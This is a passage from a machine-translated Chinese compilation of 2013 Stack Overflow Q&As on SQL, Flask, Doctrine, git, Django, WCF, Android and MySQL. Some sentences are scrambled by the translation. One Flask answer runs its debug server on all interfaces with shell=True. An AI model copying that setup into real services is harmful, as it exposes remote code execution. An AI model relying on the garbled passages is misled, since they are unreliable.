  /dir
    test.vcproj
  /otherDir
  another.vcproj 
```

# sql - SQL 和 Access 根据变量字段计算总和值。

> ID：15092953
> 
> 赞同：0
> 
> 时间：2013-02-26T15:29:53.730
> 
> 标签：sql, ms-access-2010

如果您看到我以前的帖子，请多多关照。它是“封闭的”，因为它是开放式的。

我拥有的是汽车销售员和客户的三表系统。这是在模仿一个非常简单的汽车销售系统。

Car Table 中包含以下字段：

注册： 品牌： 型号： 购买日期： 客户 ID： 销售员 ID： 销售日期： 购买日期： 价格：

或销售人员进行的每笔销售，他们将根据下表赚取佣金：

```
Car Price(£)        % Commission

0-5000          5
5000-10000          6
10000-15000         7
15000+          8 
```

汽车始终以汽车详细信息表中指定的价格出售。

我是否将表格内某处的佣金率（并自动计算）r 作为单独的表格。

如果我要将其存储在 Car Table 中，我将如何让数据库自动计算佣金并将其放入表中，以便在汽车售出时？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:56:38.800

从编程上讲，最简单的解决方案是创建一个包含 4 个字段的 COMMISSION 表：Id_Commission、Nr_Commission_Min_Value、Nr_Commission_Max_Value、Nr_Commission_Percent

然后，您将调用一个 select 语句，例如（在 mysql 中测试和工作，其 tsql 与 msaccess 非常非常相似）：

```
SELECT DISTINCT Id_Car, Car.Ds_Car_Description, Car.Nr_Car_Price, Commission.Nr_Commission_Percent * Car.Nr_Car_Price / 100 As Commission_Payable FROM Car LEFT JOIN Commission ON (Car.Nr_Car_Price BETWEEN Commission.Nr_Commission_Min_Value AND Commission.Nr_Commission_Max_Value) WHERE Car.Ic_Car_Sold = 1 ORDER BY Car.Nr_Car_Price DESC 
```

下面是用于创建和填充这些表的 sql。

```
CREATE TABLE IF NOT EXISTS Commission (
  Id_Commision int(11) NOT NULL,
  Nr_Commission_Min_Value double NOT NULL,
  Nr_Commission_Max_Value double NOT NULL,
  Nr_Commission_Percent double NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

INSERT INTO Commission (Id_Commision, Nr_Commission_Min_Value, Nr_Commission_Max_Value, Nr_Commission_Percent) VALUES

(0, 0, 5000, 5),
(1, 5001, 10000, 6),
(2, 10001, 15000, 7),
(3, 15001, 1000000000000, 8);

CREATE TABLE IF NOT EXISTS Car (
  Id_Car int(11) NOT NULL AUTO_INCREMENT,
  Ds_Car_Description varchar(20) COLLATE utf8_bin NOT NULL,
  Nr_Car_Price double NOT NULL,
  Ic_Car_Sold tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (Id_Car)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_bin AUTO_INCREMENT=7 ;

INSERT INTO Car (Id_Car, Ds_Car_Description, Nr_Car_Price, Ic_Car_Sold) VALUES
(1, 'Lotus', 20000, 1),
(2, 'Renault 5', 1000, 1),
(3, 'Audi A3', 6000, 1),
(4, 'Fiat Mille', 300, 1),
(5, 'Land Rover', 12000, 0),
(6, 'Lotus', 25000, 1); 
```

在命名字段中，我使用 Id 作为主索引，使用 Nr 作为数字，使用 Ds 作为字符串，使用 Ic 作为布尔值。我为 Banco do Brasil 设计的 dbs 的标准。

# python-2.7 - 如何在网页中连续显示 Python 输出？

> ID：15092961
> 
> 赞同：31
> 
> 时间：2013-02-26T15:30:08.137
> 
> 标签：python-2.7, flask

我希望能够访问一个网页，它将运行一个 python 函数并在网页中显示进度。

因此，当您访问该网页时，您可以看到脚本的输出，就像您从命令行运行它一样。

根据这里的答案

[如何在网页中连续显示python输出？](https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage)

我正在尝试显示**PYTHON的输出**

我正在尝试将 Markus Unterwaditzer 的代码与 python 函数一起使用。

```
import flask
import subprocess

app = flask.Flask(__name__)

def test():
    print "Test"

@app.route('/yield')
def index():
    def inner():
        proc = subprocess.Popen(
            test(),
            shell=True,
            stdout=subprocess.PIPE
        )

        while proc.poll() is None:
            yield proc.stdout.readline() + '<br/>\n'
    return flask.Response(inner(), mimetype='text/html')  # text/html is required for most browsers to show the partial page immediately

app.run(debug=True, port=5005) 
```

它运行但我在浏览器中看不到任何东西。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-03-12T06:04:05.857

嗨，您似乎不想调用测试函数，而是要调用提供输出的实际命令行进程。还可以从 proc.stdout.readline 或其他东西创建一个迭代。您还从 Python 中说过，我忘记包含您应该在子进程中提取所需的任何 Python 代码并将其放在单独的文件中。

```
import flask
import subprocess
import time          #You don't need this. Just included it so you can see the output stream.

app = flask.Flask(__name__)

@app.route('/yield')
def index():
    def inner():
        proc = subprocess.Popen(
            ['dmesg'],             #call something with a lot of output so we can see it
            shell=True,
            stdout=subprocess.PIPE
        )

        for line in iter(proc.stdout.readline,''):
            time.sleep(1)                           # Don't need this just shows the text streaming
            yield line.rstrip() + '<br/>\n'

    return flask.Response(inner(), mimetype='text/html')  # text/html is required for most browsers to show th$

app.run(debug=True, port=5000, host='0.0.0.0') 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-02-25T23:46:36.300

这是一个解决方案，允许您流式传输子流程输出并在事后使用相同的模板静态加载它（假设您的子流程将其自己的输出记录到文件中；如果没有，则将流程输出记录到日志文件中留给读者作为练习）

```
from flask import Response, escape
from yourapp import app
from subprocess import Popen, PIPE, STDOUT

SENTINEL = '------------SPLIT----------HERE---------'
VALID_ACTIONS = ('what', 'ever')

def logview(logdata):
    """Render the template used for viewing logs."""
    # Probably a lot of other parameters here; this is simplified
    return render_template('logview.html', logdata=logdata)

def stream(first, generator, last):
    """Preprocess output prior to streaming."""
    yield first
    for line in generator:
        yield escape(line.decode('utf-8'))  # Don't let subproc break our HTML
    yield last

@app.route('/subprocess/<action>', methods=['POST'])
def perform_action(action):
    """Call subprocess and stream output directly to clients."""
    if action not in VALID_ACTIONS:
        abort(400)
    first, _, last = logview(SENTINEL).partition(SENTINEL)
    path = '/path/to/your/script.py'
    proc = Popen((path,), stdout=PIPE, stderr=STDOUT)
    generator = stream(first, iter(proc.stdout.readline, b''), last)
    return Response(generator, mimetype='text/html')

@app.route('/subprocess/<action>', methods=['GET'])
def show_log(action):
    """Show one full log."""
    if action not in VALID_ACTIONS:
        abort(400)
    path = '/path/to/your/logfile'
    with open(path, encoding='utf-8') as data:
        return logview(logdata=data.read()) 
```

通过这种方式，您可以在命令的初始运行（通过 POST）和事后静态服务保存的日志文件期间获得一致的模板。

# facebook - Delphi程序中的Facebook Like按钮

> ID：15092962
> 
> 赞同：2
> 
> 时间：2013-02-26T15:30:13.553
> 
> 标签：facebook, delphi

我想在我的软件中添加一个 Facebook Like 按钮。

我知道如何以编程方式进行实际的点赞过程，但是如何检查一个人是否真的喜欢我的页面？

编辑：我猜我的软件还必须与我必须开发的实际 Facebook 应用程序进行通信，而不仅仅是与常规的 facebook html 源？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T22:38:30.980

您是否考虑过在您的 Delphi 表单上放置一个 TWebControl，为其分配一个简单的 HTML 文档字符串，其中包含 Facebook 之类按钮所需的标记，并使其足够大以显示您的 Facebook 之类按钮内容？

喜欢计数和用户喜欢的状态将由动态加载到 html 页面中的 javascript 自动处理。Facebook 编写的 JavaScript。

似乎是一种值得考虑的全功能、省力的方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:50:00.803

我没有 Facebook 来测试这个，但尝试使用中描述的内容[`this blog post`](http://developers.facebook.com/blog/post/540/)；尝试使用以下`HTTP GET`请求并在响应中（解析后），找到您要查找的用户：

```
https://graph.facebook.com/me/likes/PAGE_ID&access_token=ACCESS_TOKEN 
```

您的页面 ID 和访问令牌`PAGE_ID`应该在哪里。`ACCESS_TOKEN`对于一个简单的`GET`请求，您可以使用例如[`this code`](https://stackoverflow.com/a/11211491/960757).

# symfony - 在实体刷新时创建实体

> ID：15092965
> 
> 赞同：13
> 
> 时间：2013-02-26T15:30:15.453
> 
> 标签：symfony, doctrine-orm

我怎样才能做到这一点：

例如，我有一个名为*Issue*的实体。我需要记录该实体字段的更改。
如果用户更改*问题*实体上的字段*“状态”* ，我需要与用户创建一个关于它的数据库记录，更改字段、先前状态和新状态。

 *使用：Symfony2 + 教义2。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-02-26T15:42:11.057

您可以为此使用[事件订阅者](http://docs.doctrine-project.org/en/latest/reference/events.html)，并将其附加到 ORM 事件侦听器（在 symfony 2 中，有[关于该的文档](http://symfony.com/doc/current/cookbook/service_container/event_listener.html)）：

```
namespace YourApp\Subscriber;

use Doctrine\Common\EventSubscriber;
use Doctrine\ORM\Event\OnFlushEventArgs;
use Doctrine\ORM\Events;
use YourApp\Entity\Issue;
use YourApp\Entity\IssueLog;

class IssueUpdateSubscriber implements EventSubscriber
{
    public function onFlush(OnFlushEventArgs $args)
    {
        $em  = $args->getEntityManager();
        $uow = $em->getUnitOfWork();

        foreach ($uow->getScheduledEntityUpdates() as $updated) {
            if ($updated instanceof Issue) {
                $em->persist(new IssueLog($updated));
            }
        }

        $uow->computeChangeSets();
    }

    public function getSubscribedEvents()
    {
        return array(Events::onFlush);
    }
} 
```

您最终可以检查变更集，正如我在[Is there a built-in way to get all changed/updated fields in a Doctrine 2 entity 中](https://stackoverflow.com/questions/9057558/any-built-in-way-to-get-all-the-changed-fields-in-doctrine-2)解释的那样。

我离开了`IssueLog`示例的实现，因为这取决于您自己的要求。*

# java - 是否有工具可以为 Eclipse 中的 Maven 项目提供动态代码覆盖？

> ID：15092967
> 
> 赞同：2
> 
> 时间：2013-02-26T15:30:17.880
> 
> 标签：java, eclipse, maven, eclipse-plugin, code-coverage

这样的事情可能吗？

解释一下：我在一个项目中，验收测试是从实际网页以定制方式运行的，而不是作为 Maven 测试阶段之一的一部分。*这是一个很长的故事，为什么请考虑对此的批评是题外话！*

希望在单击运行测试的按钮后查看覆盖率。测试运行时的即时覆盖不是必需的，但至少希望能够在测试完成后在 Eclipse 中查看逐行 Java 代码覆盖 - 理想情况下，页面仍然启动并且JVM 仍在运行。

如果任何回复可以包括任何需要的工具、pom 片段和设置信息，将不胜感激。

编辑：忘了提到客户只对使用开源工具感兴趣。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T17:14:33.300

是的，这是可能且容易的。我们的（语义设计）Java 测试覆盖工具可以很好地做到这一点。

您检测应用程序并编译它。当它运行时（任何东西：单元测试、临时交互式练习等），它会收集测试覆盖率数据。在任何时候，您都可以在不影响应用程序的情况下转储测试覆盖率数据。可以立即导入和查看该转储覆盖率数据。

# git - 将 git 子模块推送到下游远程

> ID：15092972
> 
> 赞同：0
> 
> 时间：2013-02-26T15:30:25.073
> 
> 标签：git

我知道摘要信息量不大，所以我会尽力详细解释问题。我们正在开发与承包商负责的代码库部分交互所需的代码。所以我们想要访问承包商的代码，但我们不能都直接访问他们公司的服务器。

我们所做的是在我们的代码服务器上设置了一个具有帐户的现场承包商。我们已经在我们的代码服务器上为承包商的代码创建了一个裸 git 存储库，并且我们已经设置了现场承包商的本地存储库，以将我们的代码服务器作为下游远程。

所以他的本地回购是我们的中间人。问题是承包商的代码包含子模块，当我们从代码服务器克隆 repo 时，这些子模块不会自动下拉。当我们尝试做

```
$git submodule update 
```

在我们的本地机器上，它试图从承包商的服务器上获取子模块。

有没有一种聪明的方法可以让子模块也被推送到第二个遥控器，以便我们可以在本地使用它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T00:08:05.783

您需要在代码服务器上为每个子模块提供一个裸仓库。现在承包商需要将这些 repos 作为远程添加到他的子模块（给所有这些远程相同的名称，例如`external`。将主 repo 推送到您的服务器后，他然后`git submodule for-each 'push external HEAD:tempbranch'`在主 repo 中运行。这会将所有子模块推送到您的服务器.

最后你需要看看你的`.git/config`——在那里你会看到如何让子模块使用你自己的服务器而不是客户端的。然后运行`git submodule update`。

**注意**：这仅在子模块只有一个分支时才有效。如果不是这种情况，调用`push external HEAD:tempbranch`将覆盖另一个分支头。您首先需要拉出所有子模块中的所有分支。要实现这一点，您可以使用git [-up](https://github.com/aanand/git-up)`git submodule for-each up`或在这里查看：[“git pull --all”可以更新我所有的本地分支吗？](https://stackoverflow.com/questions/4318161/can-git-pull-all-update-all-my-local-branches)替代解决方案。接下来你需要运行`git submodule for-each push --all`.

# html - 用于页面布局的表格与 Div

> ID：15092973
> 
> 赞同：1
> 
> 时间：2013-02-26T15:30:28.483
> 
> 标签：html, css, html-table

我知道有很多关于手头主题的文章。我的任务是实现带有粘性页眉和页脚的固定流体 2 列布局。在阅读了几篇文章后，人们声称 div 更适合构建页面布局。在某些情况下，我同意这一点。谁能告诉我，如果我想要完成的事情，使用 div 会比使用表格更好。谁能给我一个比使用 TABLE 的附加代码更简单的 DIV 解决方案。

CSS

```
 html,body{
     height:100%;
     width:100%;
     margin : 0;
   }

   table{
    height:100%;
    width:100%;
    border-collapse: collapse;
    border-spacing: 0
   }

   #top{
     height:100px;
     background-color:black;
   }

   #bottom{
     height:100px;
     background-color:blue;
   }

   #left{
     width:250px;
     background-color:blue;
   } 
```

HTML

```
<html>
  <head>
  </head>
  <body>
    <table >
      <tr id="top">
        <td colspan="2"></td>
      </tr>
      <tr id="mid">
        <td id="left">
        </td>
        <td id="right">
       </td>
      </tr>
      <tr id="bottom">
        <td  colspan="2">
        </td>
      </tr>
    </table>
  </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:33:19.227

如果您的代码用于非表格数据，那么即使不看您的代码，我也可以告诉您该`div`元素比`table`.

有关更多信息，这篇 SO 文章非常有用：

[为什么不在 HTML 中使用表格进行布局？](https://stackoverflow.com/questions/83073/why-not-use-tables-for-layout-in-html)

* * *

> 谁能给我一个比使用 TABLE 的附加代码更简单的 DIV 解决方案

这不是关于什么是最简单的编码。加上`div`布局更具可扩展性。从长远来看，你会遇到更少的 div 障碍。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-26T15:35:42.807

在我看来，表格应该只用于表格数据——但这是*我的观点*。使用 div 的意义在于，它们更容易使用 CSS 进行操作，并且没有内置格式，您需要覆盖这些格式。对于流畅的布局，hive 认为 div 更好，因为它们本质上是流动的，而表格则不是。但是，实际上，这取决于个人喜好。在你的情况下，你可以随心所欲地去做！

# django - 我可以让 Django 管理员反映模型的层次结构吗？

> ID：15092982
> 
> 赞同：6
> 
> 时间：2013-02-26T15:30:44.067
> 
> 标签：django, model, navigation, django-admin, one-to-many

假设一个 Django 应用程序具有通过一对多关系连接的几个模型：

```
class Blog(models.Model):
    ...

class Post(models.Model):
    blog = models.ForeignKey(Blog)
    ...

class Comment(models.Model):
    post = models.ForeignKey(Post)
    ... 
```

从概念上讲，它们形成了一个层次结构，一个树状结构。我希望 Django 管理员反映这一点。尤其：

1.  在帖子的变更列表中，每个帖子都应该有一个指向相应评论变更列表的链接；
2.  同样，帖子的编辑页面应该链接到右上角按钮区域的评论更改列表；
3.  当我打开相关评论列表时，它需要反映面包屑中的关系（例如：帖子 › “Hello world” › 评论），理想情况下，也反映在 URL ( `post/123/comment/`) 中。

这当然也应该适用于层次结构的其他级别。

`list_display`使用自定义条目并使用`?post__id=`对评论更改列表的查询非常容易。但这只不过是一种黑客行为。通常 Django 假设我的三个模型是独立的顶级实体。

有没有一种简单的方法可以做到这一点？我想我可以覆盖一堆模板和`AdminModel`方法，但对于看似常见的情况，也许有更好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:53:47.350

这是一种常见的情况吗？考虑一个模型可以有几乎无限数量的外键关系这一事实，更不用说反之亦然。管理员如何“知道”如何在不进行自定义的情况下以用户需要的方式表示这些数据？

One would suggest you are used to work with content management systems rather than webframeworks (no pun intended). It's important to notice Django isn't a cms, but a webframework you can built on top of as you see fit. In a nutshell: 'Django is rather clueless and unaware of contextual requirements'.

Although the admin is quite a beast out-of-the-box, it *can* be hard to customize. There have been quite some discussions whether it should even be part of core. I can only suggest, if customizing things tends to get hacky, you should probably write your own 'admin', it's not that hard.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T17:38:33.497

Are you sure you are not just looking at [Django Admin Inline Models](https://docs.djangoproject.com/en/dev/ref/contrib/admin/#inlinemodeladmin-objects) ?

There is no way that an automated admin will pick up your relationships, because in an RDBS there can be any number of foreign keys / one to one / many to many relations, and Django does not have a customized hierarchical behavior built in.

You can indeed edit the breadcrumb customizing an admin template if you want.

For relations you might also be interested into [django MPTT](https://github.com/django-mptt/django-mptt/) that allows to make hierarchical model instances. Also see this question: [Creating efficient database queries for hierarchical models (django)](https://stackoverflow.com/questions/5653000/creating-efficient-database-queries-for-hierarchical-models-django) in that respect.

# c# - 如何从 WCF 服务流下载文件？

> ID：15092984
> 
> 赞同：3
> 
> 时间：2013-02-26T15:30:52.537
> 
> 标签：c#, jquery, .net, ajax, wcf

我正在尝试通过使用 jQuery 调用 WCF 服务来远程下载 CSV 文件。由于该文件实际上并不驻留在服务器上，因此我一直在尝试将其作为流返回。由于我使用了`Content-Disposition`标头，客户端的浏览器应该会自动开始下载具有给定文件名的文件。

我在 C# 中的 WCF 服务方法：

```
[OperationContract()]
public Stream GetCsvFile(int id)
{
    string s = ...;
    WebOperationContext.Current.OutgoingResponse.ContentType = "text/csv";
    WebOperationContext.Current.OutgoingResponse.Headers["Content-Disposition"] = "attachment; filename=\"file1.csv\"";
    return GenerateStreamFromString(s);
}

public Stream GenerateStreamFromString(string s)
{
    MemoryStream stream = new MemoryStream();
    StreamWriter writer = new StreamWriter(stream);
    writer.Write(s);
    writer.Flush();
    stream.Position = 0;
    return stream;
} 
```

我的 jQuery AJAX 请求：

```
$.ajax({
    type: "POST",
    url: serviceUrl,
    cache: false,
    data: data,
    dataType: "text",
    contentType: "application/json; charset=utf-8",
    success: function() {
        // TODO...
    }
}); 
```

此请求成功完成！我可以在响应中看到正确的 CSV 数据。但是，它不会在浏览器中启动实际的“文件下载”操作（目前在 Chrome 上进行测试），并且“file1.csv”不会保存到客户端的磁盘中。

在同一应用程序的旧 VB.NET 版本中，以下内容在 .aspx 页面代码隐藏中起作用：

```
Response.Clear()
Response.ContentType = "text/csv"
Response.AddHeader("content-disposition", "attachment; filename="file1.csv")
Response.Write(s)
Response.End() 
```

这将自动启动“file1.csv”的文件下载。甚至不会显示“另存为”对话框，文件只会立即下载。这很酷。

那么，当我尝试使用 jQuery 调用 WCF 服务时，它为什么不起作用呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-21T07:11:44.063

您需要在服务器端指定正确的 ContentType

# android - 当我在我的活动中触摸特定视图时禁用 dispatchTouchEvent

> ID：15092988
> 
> 赞同：2
> 
> 时间：2013-02-26T15:31:02.133
> 
> 标签：android, gesture

我使用 dispatchTouchEvent 使用以下代码进行滑动手势

```
@Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        // TODO Auto-generated method stub
        boolean result = super.dispatchTouchEvent(ev);
        // disable the gesture in this screen because we have   
        return gDetector.onTouchEvent(ev);
    } 
```

我想使用 SignatureView 使用 [https://github.com/CoatedMoose/CustomViews/blob/master/library/src/com/coatmoose/customviews/SignatureView.java](https://github.com/CoatedMoose/CustomViews/blob/master/library/src/com/coatedmoose/customviews/SignatureView.java)来捕获客户签名， 所以我想禁用滑动手势时用户在 SignatureView 中单击，我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:49:52.333

我不熟悉这个`SignatureView`项目，但对于一个常客来说，`GesturDetector`你可以像下面这样将事件传递给`GestureDetector`只有在它的“目标”范围内时`View`：

```
@Override
public boolean dispatchTouchEvent(MotionEvent ev) {

    boolean result = super.dispatchTouchEvent(ev);

    if (inSignatureArea(ev)) {
        return gDetector.onTouchEvent(ev);
    }
    else {
        return result;
    }     
}

public boolean inSignatureArea(MotionEvent ev) {
    float eventX = ev.getX();
    float eventY = ev.getY();
    return (eventX > signatureArea.getX() && eventX < (signatureArea.getX() + signatureArea.getWidth())) ;
    // && (same thing for Y and height); 
} 
```

您应该能够使其适应您的需求。

# mysql - MySQL：如何加快连接速度？

> ID：15092990
> 
> 赞同：0
> 
> 时间：2013-02-26T15:31:11.053
> 
> 标签：mysql, join

我有 2 张桌子，我需要加入它们。不幸的是，我没有可以使用的 id，唯一的标准是一些 varchar 列。这是连接的“on”部分：

```
join sales_flat_order_address sfoa on    
   concat(lower(trim(sfoa.firstname)), lower(trim(sfoa.lastname))) = concat(lower(trim(so.firstname)), lower(trim(so.lastname))) 
```

我知道这不是最快的方法，但是有没有办法加快速度呢？或者也许是我现在想不出的解决方法？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:34:18.647

索引 firstname 和 lastname 列将是一个开始。

首先，虽然我会在它前面使用 EXPLAIN 运行您的查询，看看是否有任何您可能已经拥有并认为正在使用的索引实际上可能没有被使用。

其次，与加入 int 相比，加入 varchar 永远不会“超级”快。

[http://dev.mysql.com/doc/refman/5.5/en/explain.html](http://dev.mysql.com/doc/refman/5.5/en/explain.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:35:18.470

您可以在名字和姓氏之间添加一个“and”以避免连接。您也可以在这些列（名字和姓氏）上使用索引，以加快速度（特别是如果您经常使用比较）。

```
join sales_flat_order_address sfoa on    
trim(sfoa.firstname) = trim(so.firstname) and trim(sfoa.lastname) = trim(so.lastname) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:35:24.107

该查询本质上是对表进行交叉连接，然后匹配条件。要解决此问题，您可以：

1.  在每个表中添加一个名为全名的新列。
2.  给它一个类似的值： `concat(lower(trim(firstname)), lower(trim(lastname)))`.
3.  在该值上建立索引。

实际上，您可以只对其中一个表执行此操作，MySQL 将使用索引进行比较（仍然需要对第一个表进行全表扫描。

您还可以有一个“全名”表，并使用每个表中的外键来获取全名。

独立索引名称不会影响查询。这些名称在函数内部被访问，这通常会关闭使用索引的能力。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-26T15:37:56.670

你可以尝试使用这个：

```
ON trim(sfoa.firstname) = trim(so.firstname)
   AND trim(sfoa.lastname) = trim(so.lastname) 
```

当然，您可以尝试在两个表中`firstname`建立索引。`lastname`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-26T15:33:46.067

至少，您应该在两个表中的 firstname 和 lastname 上创建一个索引。此外，对您的查询进行解释。这可以显示您的效率低下。

# c# - 我应该如何用它的参数调用`EditorForModel`？

> ID：15092998
> 
> 赞同：14
> 
> 时间：2013-02-26T15:31:21.480
> 
> 标签：c#, asp.net-mvc-3

在发布这个问题之前，我搜索了`EditorForModel`使用参数。

我读了[为什么不使用 Html.EditorForModel()](https://stackoverflow.com/questions/6537220/why-not-use-html-editorformodel)和这个[博客](http://bradwilson.typepad.com/blog/2009/10/aspnet-mvc-2-templates-part-1-introduction.html)。

我没有找到任何与我的需求相关的文章。

你能给我一个`EditorForModel`带参数调用的例子吗？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-02-26T15:35:18.487

这个助手有[6 个重载](http://msdn.microsoft.com/en-us/library/system.web.mvc.html.editorextensions.editorformodel%28v=vs.98%29.aspx)：

1.  `@Html.EditorForModel()`

    呈现`~/Views/Shared/EditorTemplates/TypeName.cshtml`模板，其中`TypeName`是您的视图模型的确切类型名称。如果您的视图模型是一个集合（即`IEnumerable<TypeName>`, `IList<TypeName>`, `TypeName[]`, ...），ASP.NET MVC 将自动为集合的每个元素呈现相应的编辑器模板。你不需要在你的视图中编写任何循环来实现这一点。它由框架为您处理。

2.  `@Html.EditorForModel("templatename")`

    呈现`~/Views/Shared/EditorTemplates/templatename.cshtml`而不是依赖于约定

3.  `@Html.EditorForModel(new { Foo = "bar" })`

    呈现默认的编辑器模板，但将额外的视图数据传递给它，您可以在内部使用`ViewData["foo"]`或`ViewBag.Foo`

4.  `@Html.EditorForModel("templatename", new { Foo = "bar" })`

    呈现`~/Views/Shared/EditorTemplates/templatename.cshtml`而不是依赖于约定并向其传递额外的视图数据，您可以在内部使用`ViewData["foo"]`或`ViewBag.Foo`

5.  `@Html.EditorForModel("templatename", "fieldprefix")`

    呈现`~/Views/Shared/EditorTemplates/templatename.cshtml`而不是依赖于约定并修改此模板内的导航上下文，这意味着例如，如果您`@Html.TextBoxFor(x => x.FooBar)`在此模板内有一个调用，您将得到`name="fieldprefix.FooBar"`而不是`name="FooBar"`

6.  `@Html.EditorForModel("templatename", "fieldprefix", new { Foo = "bar" })`

    呈现`~/Views/Shared/EditorTemplates/templatename.cshtml`而不是依赖于约定并修改此模板内的导航上下文，这意味着例如，如果您`@Html.TextBoxFor(x => x.FooBar)`在此模板内有一个调用，您将得到`name="fieldprefix.FooBar"`而不是`name="FooBar"`. 它还向它传递了一个额外的视图数据，你可以在里面使用`ViewData["foo"]`或者`ViewBag.Foo`

备注：模板系统将首先查找模板，`~/Views/XXX/EditorTemplates`其中 XXX 是为该视图提供服务的控制器的名称，如果找不到，它将查找`~/Views/Shared/EditorTemplates`. 这可以允许对模板进行更细粒度的调整。您可以在共享文件夹中有默认模板，每个控制器可以覆盖这些模板。